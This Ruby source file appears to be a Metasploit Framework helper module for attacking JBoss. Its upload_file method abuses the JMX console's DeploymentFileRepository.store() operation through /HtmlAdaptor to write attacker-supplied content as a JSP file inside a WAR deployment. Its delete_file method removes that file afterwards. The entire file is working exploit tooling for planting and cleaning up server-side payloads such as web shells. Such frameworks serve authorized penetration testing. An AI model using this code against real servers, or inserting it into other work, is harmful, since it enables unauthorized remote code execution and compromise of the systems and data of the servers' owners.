# -*- coding: binary -*-

module Msf::HTTP::JBoss::DeploymentFileRepository

  # Upload a text file with DeploymentFileRepository.store()
  def upload_file(base_name, jsp_name, content)
    params =  { }
    params.compare_by_identity
    params['action']     = 'invokeOpByName'
    params['name']       = 'jboss.admin:service=DeploymentFileRepository'
    params['methodName'] = 'store'
    params['argType']    = 'java.lang.String'
    params['arg0']       = base_name + '.war'
    params['argType']    = 'java.lang.String'
    params['arg1']       = jsp_name 
    params['argType']    = 'java.lang.String'
    params['arg2']       = '.jsp'
    params['argType']    = 'java.lang.String'
    params['arg3']       = content
    params['argType']    = 'boolean'
    params['arg4']       = 'True'

    opts = {
      'method'	=> http_verb,
      'uri'    => normalize_uri(target_uri.path.to_s, '/HtmlAdaptor')
    }

    if http_verb == 'POST'
      opts.merge!('vars_post' => params)
    else
      opts.merge!('vars_get' => params)
    end

    send_request_cgi(opts)
  end

  # Delete a file with DeploymentFileRepository.remove().
  def delete_file(folder, name, ext)
    params =  { }
    params.compare_by_identity
    params['action']     = 'invokeOpByName'
    params['name']       = 'jboss.admin:service=DeploymentFileRepository'
    params['methodName'] = 'remove'
    params['argType']    = 'java.lang.String'
    params['arg0']       = folder
    params['argType']    = 'java.lang.String'
    params['arg1']       = name
    params['argType']    = 'java.lang.String'
    params['arg2']       = ext

    opts = {
      'method'	=> http_verb,
      'uri'    => normalize_uri(target_uri.path.to_s, '/HtmlAdaptor')
    }

    if http_verb == 'POST'
      opts.merge!('vars_post' => params)
      timeout = 5
    else
      opts.merge!('vars_get' => params)
      timeout = 30
    end
    send_request_cgi(opts, timeout)
  end

end
